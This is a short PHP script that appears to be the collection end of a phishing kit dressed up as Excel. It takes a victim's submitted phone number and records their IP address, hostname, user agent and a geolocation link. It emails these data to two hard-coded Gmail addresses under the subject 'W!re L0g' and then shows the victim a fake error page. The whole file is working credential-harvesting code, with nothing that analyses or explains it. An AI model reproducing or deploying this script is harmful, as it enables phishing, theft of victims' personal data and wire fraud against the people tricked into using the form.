<?php
if($_POST["phone"] != "" and $_POST["phone"] != ""){
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message .= "--------------Excel Inf0-----------------------\n";
$message .= "Phone Number            : ".$_POST['phone']."\n";
$message .= "|--------------- I N F O | I P -------------------|\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "User Agent : ".$useragent."\n";
$message .= "|----------- CMG 2019 --------------|\n";
$send = "dopewireboy8@gmail.com, lion.logs101@gmail.com";
$subject = "Excellent W!re L0g | $ip";
{
mail("$send", "$subject", $message);   
}
$praga=rand();
$praga=md5($praga);
  header ("Location: error.html");
}else{
header ("Location: index.php");
}

?>